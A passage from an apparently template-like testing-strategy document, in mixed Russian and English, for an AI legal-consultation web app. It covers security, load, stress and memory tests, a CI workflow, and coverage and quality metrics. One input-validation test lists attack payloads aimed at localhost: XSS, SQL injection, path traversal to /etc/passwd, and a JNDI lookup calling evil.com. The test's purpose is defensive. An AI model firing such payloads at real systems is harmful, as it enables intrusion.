          'brute_force',
          'session_fixation',
          'csrf',
          'jwt_manipulation'
        ]
      });

      // Assert
      expect(results.vulnerabilities).toHaveLength(0);
      expect(results.recommendations).toHaveLength.greaterThan(0);
    });
  });

  describe('Input Validation Testing', () => {
    it('should test for injection attacks', async () => {
      // Act
      const results = await penetrationTester.testInputValidation({
        target: 'http://localhost:3000/api/legal/consultation',
        payloads: [
          '<script>alert("xss")</script>',
          "'; DROP TABLE users; --",
          '../../../etc/passwd',
          '${jndi:ldap://evil.com/a}'
        ]
      });

      // Assert
      expect(results.vulnerabilities).toHaveLength(0);
    });
  });

  describe('Authorization Testing', () => {
    it('should test for privilege escalation', async () => {
      // Act
      const results = await penetrationTester.testAuthorization({
        target: 'http://localhost:3000/api',
        testCases: [
          'horizontal_privilege_escalation',
          'vertical_privilege_escalation',
          'idor',
          'path_traversal'
        ]
      });

      // Assert
      expect(results.vulnerabilities).toHaveLength(0);
    });
  });
});
```

---

## 📊 Performance Testing

### **1. Load Testing**

#### **Performance Test Suite**
```typescript
// tests/performance/load-testing.ts
import { describe, it, expect } from 'vitest';
import { LoadTester } from '@/lib/performance/load-tester';
import { PerformanceMonitor } from '@/lib/performance/performance-monitor';

describe('Performance Testing', () => {
  let loadTester: LoadTester;
  let performanceMonitor: PerformanceMonitor;

  beforeAll(async () => {
    loadTester = new LoadTester();
    performanceMonitor = new PerformanceMonitor();
  });

  describe('Load Testing', () => {
    it('should handle concurrent users', async () => {
      // Arrange
      const loadTestConfig = {
        target: 'http://localhost:3000',
        users: 100,
        duration: '5m',
        rampUp: '1m'
      };

      // Act
      const results = await loadTester.runLoadTest(loadTestConfig);

      // Assert
      expect(results.responseTime.p95).toBeLessThan(2000); // 2 секунды
      expect(results.errorRate).toBeLessThan(1); // 1%
      expect(results.throughput).toBeGreaterThan(50); // 50 RPS
    });

    it('should handle AI consultation load', async () => {
      // Arrange
      const aiLoadTestConfig = {
        target: 'http://localhost:3000/api/legal/consultation',
        users: 50,
        duration: '3m',
        scenario: 'ai_consultation'
      };

      // Act
      const results = await loadTester.runLoadTest(aiLoadTestConfig);

      // Assert
      expect(results.responseTime.p95).toBeLessThan(10000); // 10 секунд для AI
      expect(results.errorRate).toBeLessThan(2); // 2% для AI
    });
  });

  describe('Stress Testing', () => {
    it('should handle peak load', async () => {
      // Arrange
      const stressTestConfig = {
        target: 'http://localhost:3000',
        users: 500,
        duration: '10m',
        rampUp: '2m'
      };

      // Act
      const results = await loadTester.runStressTest(stressTestConfig);

      // Assert
      expect(results.systemStability).toBe(true);
      expect(results.recoveryTime).toBeLessThan(30000); // 30 секунд
    });
  });

  describe('Memory Testing', () => {
    it('should not have memory leaks', async () => {
      // Arrange
      const memoryTestConfig = {
        target: 'http://localhost:3000',
        duration: '30m',
        memoryThreshold: 512 * 1024 * 1024 // 512MB
      };

      // Act
      const results = await performanceMonitor.monitorMemory(memoryTestConfig);

      // Assert
      expect(results.memoryLeaks).toHaveLength(0);
      expect(results.peakMemoryUsage).toBeLessThan(memoryTestConfig.memoryThreshold);
    });
  });
});
```

---

## 🚀 Continuous Testing

### **1. CI/CD Integration**

#### **GitHub Actions Workflow**
```yaml
# .github/workflows/continuous-testing.yml
name: Continuous Testing

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test-selection:
    runs-on: ubuntu-latest
    outputs:
      test-suite: ${{ steps.select.outputs.test-suite }}
    steps:
      - uses: actions/checkout@v4
      - name: Select Tests
        id: select
        run: |
          # AI-powered test selection
          node scripts/select-tests.js ${{ github.event.head_commit.id }}

  unit-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Run unit tests
        run: npm run test:unit -- --reporter=json --outputFile=test-results.json
      - name: Upload coverage
        uses: codecov/codecov-action@v3

  integration-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Run integration tests
        run: npm run test:integration

  e2e-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Install Playwright
        run: npx playwright install
      - name: Run E2E tests
        run: npm run test:e2e
      - name: Upload test results
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: playwright-report
          path: playwright-report/

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run security tests
        run: |
          npm run test:security
          npm audit --audit-level=moderate
      - name: Upload security report
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: security-report.json

  performance-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Run performance tests
        run: npm run test:performance
      - name: Upload performance report
        uses: actions/upload-artifact@v3
        with:
          name: performance-report
          path: performance-report.json
```

### **2. Test Automation**

#### **Automated Test Execution**
```typescript
// scripts/select-tests.js
import { IntelligentTestSelector } from './lib/testing/intelligent-test-selector';
import { ChangeAnalyzer } from './lib/testing/change-analyzer';

async function selectTests(commitHash) {
  const testSelector = new IntelligentTestSelector();
  const changeAnalyzer = new ChangeAnalyzer();
  
  // Анализируем изменения
  const changes = await changeAnalyzer.analyzeChanges(commitHash);
  
  // Выбираем тесты
  const selectedTests = await testSelector.selectTestsForExecution(changes);
  
  // Выводим результат
  console.log(`test-suite=${JSON.stringify(selectedTests)}`);
}

selectTests(process.argv[2]);
```

---

## 📈 Test Metrics and Reporting

### **1. Test Coverage**

#### **Coverage Reporting**
```typescript
// tests/coverage/coverage-reporter.ts
export class CoverageReporter {
  async generateCoverageReport(): Promise<CoverageReport> {
    const coverage = await this.collectCoverage();
    
    return {
      overall: {
        statements: coverage.statements.percentage,
        branches: coverage.branches.percentage,
        functions: coverage.functions.percentage,
        lines: coverage.lines.percentage
      },
      byFile: coverage.files.map(file => ({
        path: file.path,
        statements: file.statements.percentage,
        branches: file.branches.percentage,
        functions: file.functions.percentage,
        lines: file.lines.percentage
      })),
      thresholds: {
        statements: 80,
        branches: 75,
        functions: 80,
        lines: 80
      },
      recommendations: this.generateRecommendations(coverage)
    };
  }

  private generateRecommendations(coverage: any): string[] {
    const recommendations = [];
    
    if (coverage.statements.percentage < 80) {
      recommendations.push('Увеличить покрытие statements до 80%');
    }
    
    if (coverage.branches.percentage < 75) {
      recommendations.push('Увеличить покрытие branches до 75%');
    }
    
    return recommendations;
  }
}
```

### **2. Test Quality Metrics**

#### **Quality Assessment**
```typescript
// tests/quality/quality-metrics.ts
export class TestQualityMetrics {
  async assessTestQuality(): Promise<TestQualityReport> {
    const metrics = await this.collectMetrics();
    
    return {
      testEffectiveness: this.calculateTestEffectiveness(metrics),
      testMaintainability: this.calculateTestMaintainability(metrics),
      testReliability: this.calculateTestReliability(metrics),
      testCoverage: this.calculateTestCoverage(metrics),
      overallScore: this.calculateOverallScore(metrics),
      recommendations: this.generateQualityRecommendations(metrics)
    };
  }

  private calculateTestEffectiveness(metrics: any): number {
    // Рассчитываем эффективность тестов
    const bugDetectionRate = metrics.bugsDetected / metrics.totalBugs;
    const falsePositiveRate = metrics.falsePositives / metrics.totalTests;
    
    return (bugDetectionRate * 0.7) + ((1 - falsePositiveRate) * 0.3);
  }

  private calculateTestMaintainability(metrics: any): number {
    // Рассчитываем поддерживаемость тестов
    const testComplexity = metrics.cyclomaticComplexity / metrics.totalTests;
    const testDuplication = metrics.duplicatedTests / metrics.totalTests;
    
    return Math.max(0, 1 - (testComplexity * 0.5) - (testDuplication * 0.5));
  }
}
```

---

## 🎯 Заключение

Данная стратегия тестирования обеспечивает:

### **✅ Современные подходы 2025:**
- **AI-Powered Testing** - автоматическая генерация тестов
- **Intelligent Test Selection** - умный выбор тестов
- **Continuous Testing** - тестирование на всех этапах
- **Security-First Testing** - приоритет безопасности

### **✅ Полное покрытие:**
- **Unit Tests (70%)** - компоненты и бизнес-логика
- **Integration Tests (25%)** - API и база данных
- **E2E Tests (5%)** - критические пользовательские сценарии
- **Security Tests** - SAST, DAST, IAST
- **Performance Tests** - нагрузочное тестирование

### **✅ Автоматизация:**
- **CI/CD Integration** - автоматическое выполнение
- **Test Generation** - AI-генерация тестовых случаев
- **Quality Gates** - автоматические проверки качества
- **Reporting** - детальная отчетность

**Следующий шаг**: Внедрение тестовой инфраструктуры и настройка CI/CD! 🚀

---

*Стратегия тестирования подготовлена: 16 октября 2025*  
*Версия: 1.0*  
*Статус: Готово к внедрению ✅*
